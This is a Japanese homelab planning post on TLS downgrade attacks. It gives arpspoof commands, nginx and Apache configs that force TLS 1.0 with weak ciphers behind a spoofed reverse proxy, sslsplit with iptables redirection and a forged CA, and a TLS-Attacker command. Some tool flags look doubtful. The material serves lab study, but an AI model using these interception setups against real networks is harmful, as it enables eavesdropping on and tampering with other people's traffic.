---
title: "TLSバージョンロールバック攻撃のホームラボ構築計画"
date: 2026-10-07
tags: ["tool", "vulnerability"]
---

> この記事は検証予定の計画メモです。実際にホームラボで実施した後、結果や詰まった点を追記していきます。

## 概要

TLSバージョンロールバック(ダウングレード)攻撃は、クライアントとサーバー間のTLSハンドシェイクに介入し、より新しく安全なTLSバージョン(TLS 1.2/1.3など)ではなく、脆弱な古いバージョン(TLS 1.0など)で接続を確立させる攻撃。[[中間者攻撃(MITM攻撃)]]の一種だが、MITM自体は「通信の中間に入る立ち位置」を指す言葉であり、ARPスプーフィングはその実現手法の一つに過ぎない点に注意する。

TLSバージョンを古いものに固定させられると、[[SSL/TLS]]・[[TLSハンドシェイク]]で選択される暗号スイートも弱いものに制限され、総当たり攻撃や既知の脆弱性(POODLEなど)を悪用した復号・改ざんが現実的になる。

## MITMの実現パターン

ホームラボで実践可能な、中間に介入する手段は複数ある。

| 手法 | ARPスプーフィング必要? | 用途 |
|------|------------------------|------|
| DNSスプーフィング | 不要 | 独自CA・独自DNSがある環境で最も確実 |
| プロキシ設定 | 不要 | クライアント側の設定変更が許される場合 |
| ARPスプーフィング | 必要 | クライアントに変更を加えない透過的なMITM |
| 悪意あるWiFi AP(Evil Twin) | 不要 | WiFiクライアントが対象の場合 |

### 1. ARPスプーフィング(同一LAN内)

```bash
# arpspoof(dsniffパッケージ)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# トラフィックが攻撃者マシンを経由するようになる
# → その後 sslsplit や bettercap でTLSバージョンを書き換える
```

### 2. DNSスプーフィング(独自CA+独自DNSがあるなら最も簡単)

```
# DNSで対象ドメインを攻撃者サーバーのIPに解決させる
target.example.com → 192.168.1.50(攻撃者マシン)

# 攻撃者マシン側でリバースプロキシを立て、TLS 1.0を強制する
```

ARPスプーフィング不要でクリーンに検証できるため、[[homelab-two-mail-servers-dns-postfix-dovecot|自作DNS]]や[[openssl-private-ca|プライベートCA]]を既に持っている環境では、この経路が一番やりやすい。

### 3. プロキシ設定(最も単純)

```bash
# テスト用クライアント(Firefox)に手動でプロキシ設定
# 攻撃者マシンのBurp Suiteやmitmproxyを経由させる
# Firefox設定 → プロキシ → 手動設定 → 攻撃者IP:8080
```

### 4. 悪意あるWiFiアクセスポイント(Evil Twin)

```bash
# hostapdで偽APを作成し、接続したクライアントの全トラフィックを傍受・改変する
```

## 攻撃の流れ(DNSスプーフィング版)

```
[Firefox] → DNS問い合わせ → [独自DNSサーバー]
                                  ↓
                            target.example.com = 192.168.1.50
                                  ↓
[Firefox] → TLS接続 → [攻撃者サーバー(192.168.1.50)]
                         ↓(バックエンドで本物サーバーに接続)
                  ClientHello(TLS1.2) → 書き換え → ClientHello(TLS1.0)
                         ↓
                  [本物サーバー] ← TLS1.0接続確立
```

## 既存のARP/DNSスプーフィング環境をそのまま流用する

以前構築した[[arp-dns-spoofing-fake-website-credential-theft]]の環境(ARPスプーフィング + DNSスプーフィング + 偽装Webサーバー)は、TLSバージョンロールバック攻撃の基盤としてそのまま使える。追加で必要なのは「偽装サーバーでTLSバージョンを強制/書き換えする」部分のみ。

### パターン1: 偽装サーバーを「TLS 1.0強制」に改造(最も簡単)

```nginx
# /etc/nginx/sites-available/fake-site
server {
    listen 443 ssl;
    server_name www.example.com;

    # TLS 1.0のみ許可(ダウングレード強制)
    ssl_protocols TLSv1;
    ssl_ciphers 'DES-CBC3-SHA:RC4-SHA';  # 弱い暗号のみ

    # 正規サーバーへのリバースプロキシ
    location / {
        proxy_pass https://正規サーバーIP:443/;
        proxy_ssl_protocols TLSv1;
    }
}
```

Apacheの場合:

```apache
<VirtualHost *:443>
    ServerName www.example.com

    SSLProtocol -all +TLSv1
    SSLCipherSuite DES-CBC3-SHA:RC4-SHA

    SSLCertificateFile /etc/ssl/certs/fake.crt
    SSLCertificateKeyFile /etc/ssl/private/fake.key

    SSLProxyEngine on
    SSLProxyProtocol TLSv1
    ProxyPass / https://正規サーバーIP/
    ProxyPassReverse / https://正規サーバーIP/
</VirtualHost>
```

この設定で起きること:
1. 被害者が `https://www.example.com` にアクセス
2. DNSスプーフィングで偽装サーバー(Kali)に接続
3. TLSハンドシェイクでTLS 1.0が強制される
4. 被害者のブラウザがTLS 1.0にフォールバック
5. 弱い暗号スイートのため、攻撃者は通信を復号・改変しやすくなる

### パターン2: sslsplitで動的にバージョンを書き換える

```bash
# Kaliにインストール
apt install sslsplit

# CA証明書を生成(既存のプライベートCAを流用してもよい)
openssl genrsa -out /etc/sslsplit/ca.key 2048
openssl req -new -x509 -key /etc/sslsplit/ca.key \
  -out /etc/sslsplit/ca.crt -days 365

# iptablesでトラフィックをsslsplitにリダイレクト
iptables -t nat -A PREROUTING -p tcp --dport 443 \
  -j REDIRECT --to-ports 8443

# sslsplit実行(TLS 1.0強制)
sslsplit -D -l /var/log/sslsplit.log \
  -k /etc/sslsplit/ca.key -c /etc/sslsplit/ca.crt \
  -P https 0.0.0.0 8443 \
  -M TLS1.0
```

```
[被害者] → DNSスプーフィング → [Kali:443]
                              ↓ sslsplit
                    [TLS1.2要求] →書き換え→ [TLS1.0強制]
                              ↓
                        [正規サーバー]
```

### パターン3: TLS-Attackerで高度な攻撃

```bash
git clone https://github.com/tls-attacker/TLS-Attacker.git
cd TLS-Attacker && mvn clean install

java -jar Attacks.jar downgrade \
  -connect www.example.com:443 \
  -version TLS12
```

## 構築手順(既存環境ベース)

1. **既存環境を再利用**: ARPスプーフィング・DNSスプーフィング・偽装Webサーバーは[[arp-dns-spoofing-fake-website-credential-theft]]の状態をそのまま使う
2. **偽装サーバーをHTTPS対応にする**
   ```bash
   a2enmod ssl proxy proxy_http

   # 自己署名証明書(既存のプライベートCAで発行するのが望ましい)
   openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
     -keyout /etc/ssl/private/fake.key \
     -out /etc/ssl/certs/fake.crt \
     -subj "/CN=www.example.com"
   ```
3. **TLS 1.0を強制する設定を入れる**(上記パターン1/2のいずれか)
4. **被害者側Firefoxの設定を確認**
   ```
   about:config → security.tls.version.min を 1 に設定(TLS 1.0を許可)
   ```
   アクセス時にF12の開発者ツール→セキュリティタブで「TLS 1.0使用」と表示されることを確認する。

## 検証ポイント

| 確認項目 | コマンド/方法 |
|---------|-------------|
| TLSバージョン確認 | `openssl s_client -connect www.example.com:443 -tls1` |
| 暗号スイート確認 | `nmap --script ssl-enum-ciphers -p 443 www.example.com` |
| パケット確認 | Wiresharkで ClientHello の version フィールドを確認 |
| ブラウザ確認 | Firefox開発者ツール → セキュリティタブ → 接続の詳細 |

## まとめ

- 既存のARP/DNSスプーフィング環境はそのまま使える。追加で必要なのは「偽装サーバー側でのTLSバージョン強制」と「被害者ブラウザ側でTLS 1.0を許可する設定」の2点のみ
- 独自CA・独自DNSを持つホームラボなら、ARPスプーフィングを使わず**DNSスプーフィング経由**が最も確実でクリーン
- 最初に試すならパターン1(nginx/ApacheでのTLS 1.0強制)が最も単純
